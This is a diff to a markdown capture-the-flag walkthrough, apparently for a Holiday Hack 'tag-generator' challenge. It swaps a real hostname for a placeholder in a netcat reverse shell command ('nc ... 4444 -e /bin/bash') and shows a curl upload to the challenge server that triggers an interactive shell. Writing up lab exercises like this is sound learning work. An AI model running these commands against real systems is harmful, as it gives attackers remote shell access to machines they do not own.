@@ -48,7 +48,7 @@ GREETZ=JackFrostWasHere
 ## Full Interactive Remote Shell
 Create a file for executing a reverse shell named `t.jpg`:
 ```
-nc home.schwarzwaelder.name 4444 -e /bin/bash
+nc <your IP address> 4444 -e /bin/bash
 ```
 Create an executor file:
 ```
@@ -68,9 +68,9 @@ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 Now you have in the reverse shell listener an interactive shell as user `app`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTYxOTI5NzQxMSwtNTc2NjEwMDc1LDIxMD
-c1Mjk4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2MSwxMTUxNTU2ODk2
-LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xNDY3NjE1MjYyLC0yND
-M5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLTE2MDYwNzgw
-NDBdfQ==
+eyJoaXN0b3J5IjpbLTE1OTkyNTQ0MTUsLTYxOTI5NzQxMSwtNT
+c2NjEwMDc1LDIxMDc1Mjk4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2
+MSwxMTUxNTU2ODk2LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xND
+Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
+NjUsLTE2MDYwNzgwNDBdfQ==
 -->
